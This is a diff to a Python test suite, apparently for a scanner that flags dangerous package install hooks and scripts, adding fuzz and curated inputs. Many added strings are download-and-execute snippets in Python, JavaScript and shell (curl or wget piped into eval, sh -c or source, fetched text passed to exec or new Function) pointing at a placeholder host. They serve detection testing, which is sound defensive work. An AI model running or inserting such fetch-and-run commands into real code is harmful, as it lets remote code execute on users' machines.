@@ -130,6 +130,33 @@ CURATED = [
     "#!/usr/bin/env\nnode\n", "#!\n/usr/bin/node", "#!/usr/bin/env \n", "#!/usr/bin/perl -w\n",
     "#!/usr/bin/env -S", "#!env node", "#!/usr/bin/env A=1 node", "\ufeff#!/usr/bin/env node", " #!/bin/sh",
     "#!/bin/\u212ash", "#!/usr/bin/env \u017fh", "#!/usr/bin/nodejs\x1cx", "#!/usr/bin/env\xa0node",
+    # code that runs what it receives over the network (runs_received_code), and
+    # downloads substituted into a command line (runs_substituted_download)
+    "import subprocess, urllib.request\ncode = urllib.request.urlopen('https://files.invalid/p.js')"
+    ".read().decode()\nsubprocess.run(['node', '-e', code])\n",
+    "import requests\nexec(requests.get('https://files.invalid/p.py').text)\n",
+    "const https = require('https');\nhttps.get('https://files.invalid/p', (res) => {\n  let b = '';\n"
+    "  res.on('data', (c) => { b += c; });\n  res.on('end', () => eval(b));\n});\n",
+    "fetch('https://files.invalid/p')\n  .then((r) => r.text())\n  .then((code) => new Function(code)());\n",
+    "execSync(`node -e ${await (await fetch(u)).text()}`)\n", "os.system(f'python -c \"{requests.get(u).text}\"')\n",
+    "const m = /v(\\d+)/.exec(await (await fetch(u)).text());\n", "execSync('npm i -g x@' + (await r.json()).v);\n",
+    "sh -c \"$(curl -fsSL https://files.invalid/i.sh)\"\n", "source <(curl -s https://files.invalid/e.sh)\n",
+    "eval \"$(wget -qO- https://files.invalid/i.sh)\"\n", "node -e \"$(curl -s https://files.invalid/p.js)\"\n",
+    "require('child_process').execSync('bash -c \"$(curl -fsSL https://files.invalid/i.sh)\"');\n",
+    "x" * 1500 + ";eval(await(await fetch('https://files.invalid/p')).text());",
+    # quotes paired from a call's '(' (a regex literal's quote before it), a
+    # value read past a cut argument list, callbacks of an inline require(),
+    # shell=True calls, and names past the searches (an index of the text)
+    "/'/.test(s); new Function('a', https.get('https://files.invalid/p'));\n",
+    "/'/.test(s); code = await (await fetch(u)).text(); /'/.test(s);\neval(code);\n",
+    "eval(" + "\U0001d41a" * 240 + ", " + "\u00e9" * 150 + ", await fetch(u))\n",
+    "require('https').get(u, (res) => { res.on('data', (c) => { b += c; }); res.on('end', () => eval(b)); });\n",
+    "import subprocess, requests\nx = requests.get(u).text\nsubprocess.run(\n  x, shell=True)\n",
+    "shell=True\n" + "run(" * 300 + "fetch(u);" + "z" * 900,
+    "".join(f"const f{i} = (u) => fetch(u);\n" for i in range(70)) + "eval(await f69(u));\n",
+    "".join(f"import requests as r{i}\n" for i in range(70)) + "exec(r69.get(u).text)\n",
+    "x = fetch(u); y = x; " + "a, " * 40 + "z = y\neval(z)\n",
+    "'eval(" * 30 + "fetch(u))\n", "\"'`eval(" * 20 + "x\nx = fetch(u)\n",
 ]
 
 # The pieces random cases are made of. MIXED reaches every function; the
@@ -183,6 +210,25 @@ SCRIPT = ["\n", "\n", " ", "curl -s ", "wget -qO- ", "https://files.invalid/x.sh
           "x.onion", "env | ", "printenv > ", "$(env)", "Object.keys(process.env)", ".npmrc", "\u017f", "\u212a",
           "execSync('curl -s https://files.invalid/x.sh | sh')",
           "subprocess.run(\"wget -qO- https://files.invalid/x|bash\")"]
+RECEIVED = ["\n", "\n", "\n", " ", ";", "(", ")", "=", "'", '"', "`", "\\", "\t", "{", "}", ",",
+            "code", "body", "r", "res", "c", "data", "\u00e9", "\U0001d41a", "rq", "load",
+            "const code = ", "let body = '';", "code = ", "body += c;", "r = ", "{ data } = ", "code: str = ",
+            "fetch('https://files.invalid/p')", "await fetch(u)", "(await fetch(u)).text()", "requests.get(u).text",
+            "urlopen(u).read()", "urllib.request.urlopen(u).read().decode()", "new XMLHttpRequest()",
+            "socket.create_connection(('h', 1))", "execSync('curl -s https://files.invalid/p')", "require('https')",
+            "https.get(u, (res) => {", "res.on('data', (c) => {", ".then((r) => r.text())", "  .then((code) => ",
+            "axios.get(u)", "import requests as rq", "from requests import get", "import * as h from 'https';",
+            "with urlopen(u) as r:", "for c in r:", "return r.text", "def load():", "function load(u) {",
+            "const load = (u) => fetch(u);", "eval(", "exec(", "new Function(", "vm.runInThisContext(",
+            "execSync(", "os.system(", "subprocess.run(code, shell=True)", "spawn('node', ['-e', ",
+            "subprocess.run([sys.executable, '-c', ", "spawn(process.execPath, ['-e', ", "cp.exec(",
+            "execSync(`node -e ${", "os.system(f'python -c \"{", "/re/.exec(", "exec(x) {", "def exec(self):",
+            "Buffer.from(", ", 'base64').toString()", "compile(", "await ", "load()", "r.text", "body)", "code)",
+            "sh -c \"$(curl ", "$(curl -s https://files.invalid/i.sh)", "source <(curl ", "eval \"$(wget -qO- ",
+            "x" * 600, "\U0001d41a" * 300, "filler\n" * 30,
+            "/'/", "' ", "require('https').get(u, (res) => ", "shell=True", "run(", "Popen([", "a, a, a, ",
+            "for (const c of ", "lambda r: ", "function (c) {", "\U0001d41a" * 120, " " * 120, ".then(",
+            "f'python -c \"{", "`${"]
 SHEBANG = ["#!", " ", " ", "\t", "\n", "\r", "/", "/usr/bin/", "/usr/bin/env", "env", "-S", "-i", "-u", "--",
            "node", "NODE", "nodejs", "deno", "bun", "ts-node", "tsx", "python", "python3.12", "py", "pypy",
            "sh", "bash", "zsh", "perl", "A=1", "\u212a", "\u017f", "\x1c", "\xa0", "\x85", "\u0663", "\U0001F600",
@@ -198,7 +244,7 @@ def corpus(seed=20260926, scale=1):
     rnd = random.Random(seed)
     cases = list(CURATED)
     for pieces, count, most in ((MIXED, 2500, 14), (QUOTING, 1500, 16), (CD, 1500, 16), (NODE_E, 1500, 16),
-                                (SCRIPT, 1000, 12)):
+                                (SCRIPT, 1000, 12), (RECEIVED, 1500, 16)):
         for _ in range(count * scale):
             cases.append("".join(rnd.choice(pieces) for _ in range(rnd.randint(1, most))))
     for _ in range(1500 * scale):                   # #! lines: an interpreter, then anything
@@ -280,7 +326,8 @@ class HookParityTests(unittest.TestCase):
             counts["node -e codes"] += bool(codes)
             for reason in install + on_import:
                 counts[reason.split(" (")[0]] += 1          # (the exfiltration reason names the address)
-        self.assertEqual(len(counts), 12, counts)           # 3 install-script reasons, 2 import-time ones, 3 #! languages
+        self.assertEqual(len(counts), 13, counts)           # 4 install-script reasons, 3 import-time ones (one of
+                                                            # them the same text), 3 #! languages
         self.assertEqual({k: n for k, n in counts.items() if n < 100 and k != "not followed completely"}, {}, counts)
         self.assertGreaterEqual(counts["not followed completely"], 7, counts)   # the curated limit cases
 
@@ -300,9 +347,11 @@ class HookParityTests(unittest.TestCase):
             with self.subTest(options=name):
                 self.assertEqual(table, {k: sorted(v) for k, v in getattr(core, name).items()})
         self.assertEqual(self.twins["limits"], {k: getattr(core, k) for k in
-                                                ("HOOK_MAX_CHARS", "HOOK_MAX_COMMANDS", "HOOK_MAX_TARGETS", "HOOK_MAX_PATH")})
-        self.assertEqual(len(self.twins["patterns"]), 16)
-        self.assertEqual(len(self.twins["sets"]), 10)
+                                                ("HOOK_MAX_CHARS", "HOOK_MAX_COMMANDS", "HOOK_MAX_TARGETS", "HOOK_MAX_PATH",
+                                                 "_DL_LONG_ROW", "_DL_WINDOW", "_DL_ARG_SPAN", "_DL_LOOKBACK",
+                                                 "_DL_NAMED_SEARCHES", "_DL_PHASES")})
+        self.assertEqual(len(self.twins["patterns"]), 48)
+        self.assertEqual(len(self.twins["sets"]), 17)
         self.assertEqual(len(self.twins["maps"]), 3)
 
 if __name__ == "__main__":
